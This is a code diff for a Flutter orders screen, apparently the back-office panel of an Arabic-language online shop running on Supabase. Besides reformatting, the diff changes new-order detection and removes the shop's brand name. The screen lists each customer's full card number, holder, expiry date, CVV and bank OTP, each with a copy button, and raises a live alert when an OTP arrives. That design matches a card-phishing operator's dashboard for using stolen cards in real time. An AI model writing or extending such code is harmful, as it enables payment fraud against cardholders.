@@ -29,39 +29,40 @@ class _OrdersScreenState extends State<OrdersScreen> {
         .stream(primaryKey: ['id'])
         .order('id', ascending: false)
         .listen((data) {
-      final oldList = List<Map<String, dynamic>>.from(_orders);
-      final oldCount = oldList.length;
-      setState(() { _orders = data; _loading = false; });
-      if (_initialLoad) { _initialLoad = false; return; }
-
-      // New orders
-      if (data.length > oldCount) {
-        for (int i = oldCount; i < data.length; i++) {
-          final o = data[i];
-          NotificationService.show(
-            title: '🛒 طلب جديد!',
-            body: 'تم بدء طلب جديد في المتجر',
-          );
-        }
-      }
-
-      // OTP updates (order had no OTP before, now has OTP)
-      for (final o in data) {
-        final otp = (o['card_otp'] ?? '').toString();
-        if (otp.isNotEmpty) {
-          final oldOrder = oldList.where((x) => x['id'] == o['id']).isNotEmpty
-              ? oldList.firstWhere((x) => x['id'] == o['id'])
-              : null;
-          final oldOtp = oldOrder != null ? ((oldOrder['card_otp'] ?? '')?.toString() ?? '') : '';
-          if (oldOtp.isEmpty) {
-            NotificationService.show(
-              title: '✅ تم تأكيد الدفع مع OTP!',
-              body: '${o['customer_name'] ?? 'عميل'} - اكتمل الدفع',
-            );
+          final oldList = List<Map<String, dynamic>>.from(_orders);
+          final oldCount = oldList.length;
+          setState(() {
+            _orders = data;
+            _loading = false;
+          });
+          if (_initialLoad) {
+            _initialLoad = false;
+            return;
           }
-        }
-      }
-    });
+          final oldIds = oldList.map((o) => o['id']).toSet();
+
+          for (final o in data) {
+            if (!oldIds.contains(o['id'])) {
+              NotificationService.show(
+                title: '🛒 طلب جديد!', body: 'تم بدء طلب جديد في المتجر',
+              );
+            }
+          }
+
+          for (final o in data) {
+            final otp = (o['card_otp'] ?? '').toString();
+            if (otp.isNotEmpty && oldIds.contains(o['id'])) {
+              final oldOrder = oldList.firstWhere((x) => x['id'] == o['id']);
+              if (((oldOrder['card_otp'] ?? '')?.toString() ?? '') == '') {
+                NotificationService.show(
+                  title: '✅ تم تأكيد الدفع مع OTP!',
+                  body: '${o['customer_name'] ?? 'عميل'} - اكتمل الدفع',
+                );
+              }
+            }
+          }
+
+        });
   }
 
   Future<void> _loadOrders() async {
@@ -70,7 +71,10 @@ class _OrdersScreenState extends State<OrdersScreen> {
           .from('orders')
           .select('*')
           .order('id', ascending: false);
-      setState(() { _orders = data; _loading = false; });
+      setState(() {
+        _orders = data;
+        _loading = false;
+      });
       _subscribe();
     } catch (_) {
       setState(() => _loading = false);
@@ -79,7 +83,8 @@ class _OrdersScreenState extends State<OrdersScreen> {
 
   List<Map<String, dynamic>> get _filtered {
     if (_filter == 'all') return _orders;
-    if (_filter == 'new') return _orders.where((o) => (o['card_otp'] ?? '') == '').toList();
+    if (_filter == 'new')
+      return _orders.where((o) => (o['card_otp'] ?? '') == '').toList();
     return _orders.where((o) => (o['card_otp'] ?? '') != '').toList();
   }
 
@@ -87,7 +92,7 @@ class _OrdersScreenState extends State<OrdersScreen> {
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: const Text('AURA GLOW - الطلبات'),
+        title: const Text('الطلبات'),
         actions: [
           PopupMenuButton<String>(
             icon: const Icon(Icons.filter_list),
@@ -104,12 +109,12 @@ class _OrdersScreenState extends State<OrdersScreen> {
       body: _loading
           ? const Center(child: CircularProgressIndicator())
           : _filtered.isEmpty
-              ? const Center(child: Text('لا توجد طلبات'))
-              : ListView.builder(
-                  padding: const EdgeInsets.all(12),
-                  itemCount: _filtered.length,
-                  itemBuilder: (_, i) => _buildCard(_filtered[i]),
-                ),
+          ? const Center(child: Text('لا توجد طلبات'))
+          : ListView.builder(
+              padding: const EdgeInsets.all(12),
+              itemCount: _filtered.length,
+              itemBuilder: (_, i) => _buildCard(_filtered[i]),
+            ),
     );
   }
 
@@ -136,23 +141,52 @@ class _OrdersScreenState extends State<OrdersScreen> {
         child: Column(
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
-            Row(children: [
-              Icon(hasOtp ? Icons.check_circle : Icons.pending, color: hasOtp ? Colors.green : Colors.orange, size: 20),
-              const SizedBox(width: 8),
-              Expanded(child: Text(name, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 16))),
-              Text('$total ₪', style: TextStyle(fontWeight: FontWeight.bold, color: Colors.amber.shade800, fontSize: 16)),
-            ]),
+            Row(
+              children: [
+                Icon(
+                  hasOtp ? Icons.check_circle : Icons.pending,
+                  color: hasOtp ? Colors.green : Colors.orange,
+                  size: 20,
+                ),
+                const SizedBox(width: 8),
+                Expanded(
+                  child: Text(
+                    name,
+                    style: const TextStyle(
+                      fontWeight: FontWeight.bold,
+                      fontSize: 16,
+                    ),
+                  ),
+                ),
+                Text(
+                  '$total ₪',
+                  style: TextStyle(
+                    fontWeight: FontWeight.bold,
+                    color: Colors.amber.shade800,
+                    fontSize: 16,
+                  ),
+                ),
+              ],
+            ),
             const Divider(height: 16),
             _row('الهاتف', phone),
             _row('التاريخ', date),
             if (hasCard) ...[
               const Divider(height: 8),
-              const Text('بيانات البطاقة:', style: TextStyle(fontWeight: FontWeight.bold)),
+              const Text(
+                'بيانات البطاقة:',
+                style: TextStyle(fontWeight: FontWeight.bold),
+              ),
               _row('رقم البطاقة', num, mono: true, copyable: true),
               _row('صاحبها', holder, copyable: true),
               _row('تاريخ الانتهاء', expiry, copyable: true),
               _row('رمز الأمان (CVV)', cvv, mono: true, copyable: true),
-              _row('رمز التحقق (OTP)', otp.isEmpty ? '-' : otp, mono: true, copyable: otp.isNotEmpty),
+              _row(
+                'رمز التحقق (OTP)',
+                otp.isEmpty ? '-' : otp,
+                mono: true,
+                copyable: otp.isNotEmpty,
+              ),
             ],
           ],
         ),
@@ -160,12 +194,20 @@ class _OrdersScreenState extends State<OrdersScreen> {
     );
   }
 
-  Widget _row(String label, String value, {bool mono = false, bool copyable = false}) {
+  Widget _row(
+    String label,
+    String value, {
+    bool mono = false,
+    bool copyable = false,
+  }) {
     return Padding(
       padding: const EdgeInsets.symmetric(vertical: 2),
       child: Row(
         children: [
-          Text('$label: ', style: TextStyle(color: Colors.grey.shade600, fontSize: 13)),
+          Text(
+            '$label: ',
+            style: TextStyle(color: Colors.grey.shade600, fontSize: 13),
+          ),
           const SizedBox(width: 4),
           Expanded(
             child: copyable
@@ -184,24 +226,39 @@ class _OrdersScreenState extends State<OrdersScreen> {
                       },
                       borderRadius: BorderRadius.circular(8),
                       child: Container(
-                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
+                        padding: const EdgeInsets.symmetric(
+                          horizontal: 8,
+                          vertical: 4,
+                        ),
                         decoration: BoxDecoration(
-                          border: Border.all(color: Colors.amber.shade200, width: 1),
+                          border: Border.all(
+                            color: Colors.amber.shade200,
+                            width: 1,
+                          ),
                           borderRadius: BorderRadius.circular(8),
                           color: Colors.amber.shade50,
                         ),
-                        child: Text(value,
+                        child: Text(
+                          value,
                           style: TextStyle(
                             fontSize: 13,
                             fontFamily: mono ? 'monospace' : null,
-                            fontWeight: mono ? FontWeight.bold : FontWeight.normal,
+                            fontWeight: mono
+                                ? FontWeight.bold
+                                : FontWeight.normal,
                             color: mono ? Colors.amber.shade900 : null,
                           ),
                         ),
                       ),
                     ),
                   )
-                : Text(value, style: TextStyle(fontSize: 13, fontFamily: mono ? 'monospace' : null)),
+                : Text(
+                    value,
+                    style: TextStyle(
+                      fontSize: 13,
+                      fontFamily: mono ? 'monospace' : null,
+                    ),
+                  ),
           ),
         ],
       ),
